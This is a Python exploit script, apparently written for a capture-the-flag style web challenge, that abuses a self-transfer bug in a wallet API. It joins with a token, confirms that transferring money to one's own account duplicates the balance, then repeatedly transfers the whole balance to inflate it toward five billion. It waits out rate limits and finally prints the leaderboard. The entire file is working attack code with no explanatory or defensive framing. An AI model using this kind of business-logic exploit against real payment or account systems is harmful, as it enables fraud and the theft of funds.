import requests, time
B="http://13.37.197.230:28493"; TOK="d27bc68efbe0e9ae"
s=requests.Session()
def call(method,path,body=None):
    for _ in range(6):
        r=s.request(method,B+path,json=body,timeout=10)
        if r.status_code==429:
            print("  [429] cooldown 65s...",flush=True); time.sleep(65); continue
        try: return r.status_code,r.json()
        except: return r.status_code,r.text[:100]
    return 429,{"error":"rate"}
def me(): return call("GET","/api/me")[1]

print("cooldown 40s...",flush=True); time.sleep(40)
print("join:",call("POST","/api/join",{"token":TOK}),flush=True)
m=me(); mc=m.get("code"); w=m.get("wallet"); print("me:",m,flush=True)

# CONFIRM: self-transfer 10000
time.sleep(6)
code,j=call("POST","/api/transfer",{"to_code":mc,"montant":10000})
print("self-transfer 10000 ->",code,j,flush=True)
m2=me(); print("me after:",m2,flush=True)
dup = isinstance(j,dict) and j.get("ok") and isinstance(m2.get("wallet"),int) and m2["wallet"]>w
print("DUP CONFIRMED" if dup else "no dup",flush=True)

if dup:
    w=m2["wallet"]
    TARGET=5_000_000_000
    it=0
    while w < TARGET+50000 and it<40:
        time.sleep(5)
        code,j=call("POST","/api/transfer",{"to_code":mc,"montant":int(w)})
        if isinstance(j,dict) and "wallet" in j:
            neww=j["wallet"]
            print(f"  it{it}: montant={w} -> wallet={neww} (Δ{neww-w})",flush=True)
            if neww<=w:
                print("  plus de duplication, stop",flush=True); break
            w=neww
        else:
            print("  transfer err:",code,j,flush=True); break
        it+=1
    print("FINAL me:",me(),flush=True)
    lb=call("GET","/api/leaderboard")[1]
    top=lb[:3] if isinstance(lb,list) else lb
    print("TOP3:",top,flush=True)
